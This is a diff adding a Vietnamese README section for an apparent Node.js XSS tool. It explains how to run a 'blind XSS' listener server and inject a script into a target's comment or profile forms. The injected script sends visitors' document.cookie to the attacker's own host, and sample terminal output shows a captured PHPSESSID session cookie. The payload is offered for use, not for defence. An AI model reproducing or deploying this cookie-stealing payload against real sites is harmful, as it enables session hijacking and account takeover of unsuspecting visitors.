@@ -93,13 +93,28 @@ node index.js payloads
 node index.js payloads --waf
 </pre>
 
+### Chạy blind XSS sever
+<pre> 
+#Terminal 1: Chạy server
+  node index.js server -p 8080
+  
+# Terminal 2: Inject payload vào target (ví dụ comment form, profile form, ...)
+  <script>fetch('http://IP_CUA_BAN:8080/?c='+document.cookie)</script>
+  
+-  Khi có người truy cập trang có chứa payload đó, bạn sẽ thấy trong terminal 1:
+-  [!] XSS Triggered at 2025-05-30T12:34:56.789Z
+    Remote: 203.0.113.42
+    Path: /
+    Cookie: PHPSESSID=abc123; security=low
+
+
+
 
 
 <h2>Xem trợ giúp</h2>
 
-<pre>
 node index.js --help
-</pre>
+
 
 </div>
 
